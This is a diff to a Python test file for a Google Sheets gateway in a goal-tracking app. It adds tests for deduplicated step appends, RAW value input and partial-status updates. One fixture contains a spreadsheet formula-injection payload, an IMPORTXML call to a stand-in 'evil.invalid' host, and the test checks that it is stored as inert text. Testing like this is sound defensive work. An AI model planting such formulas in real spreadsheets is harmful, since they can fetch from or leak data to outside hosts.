@@ -183,10 +183,57 @@ def test_live_gateway_closes_planned_steps() -> None:
         closed_at="2026-07-02T10:00:00+05:00",
     )
 
-    step = gateway.list_planned_steps("P001", "G001")[0]
-    assert step["step_status"] == "closed"
-    assert step["closed_week_number"] == 4
-    assert step["closed_report_id"] == "WR001"
+
+def test_live_gateway_appends_eight_steps_once_with_raw_cells() -> None:
+    sheets = minimal_live_sheets()
+    sheets["PlannedSteps"] = [sheets["PlannedSteps"][0]]
+    service = FakeSheetsService(sheets)
+    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")
+    rows = [
+        {
+            "step_id": f"S:P001:G001:{number:02d}",
+            "participant_id": "P001",
+            "goal_id": "G001",
+            "step_number": number,
+            "step_title": f"Шаг {number}",
+            "step_description": "=IMPORTXML(\"https://evil.invalid\")" if number == 1 else f"Суть {number}",
+            "step_metric": f"Метрика {number}",
+            "step_status": "open",
+        }
+        for number in range(1, 9)
+    ]
+
+    gateway.append_planned_steps(rows)
+    gateway.append_planned_steps(rows)
+
+    stored = gateway.list_planned_steps("P001", "G001")
+    assert len(stored) == 8
+    assert stored[0]["step_description"] == '=IMPORTXML("https://evil.invalid")'
+    planned_appends = [row for sheet, row in service.appended if sheet == "PlannedSteps"]
+    assert len(planned_appends) == 8
+    assert ("append", "RAW") in service.value_input_options
+
+
+def test_live_gateway_updates_metric_relation_and_partial_step_only() -> None:
+    sheets = minimal_live_sheets()
+    sheets["WeeklyReportSteps"].append([
+        "WRS001", "WR001", "P001", "S001", "partial", "partial", "старый факт", "now"
+    ])
+    sheets["PlannedSteps"].append([
+        "S002", "P001", "G001", 2, "Шаг 2", "Суть", "Метрика", "closed", "", "", ""
+    ])
+    service = FakeSheetsService(sheets)
+    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")
+
+    gateway.update_weekly_report_step_metric("WR001", metric_result_text="новый факт")
+    gateway.mark_planned_steps_partial("P001", "G001", ["S001", "S002"], updated_at="later")
+
+    relation = gateway.list_weekly_report_steps()[0]
+    steps = {row["step_id"]: row for row in gateway.list_planned_steps("P001", "G001")}
+    assert relation["metric_result_text"] == "новый факт"
+    assert steps["S001"]["step_status"] == "partial"
+    assert steps["S002"]["step_status"] == "closed"
+    assert all(option == "RAW" for _operation, option in service.value_input_options)
 
 
 def _step(step_id: str, participant_id: str, goal_id: str, status: str) -> dict[str, object]:
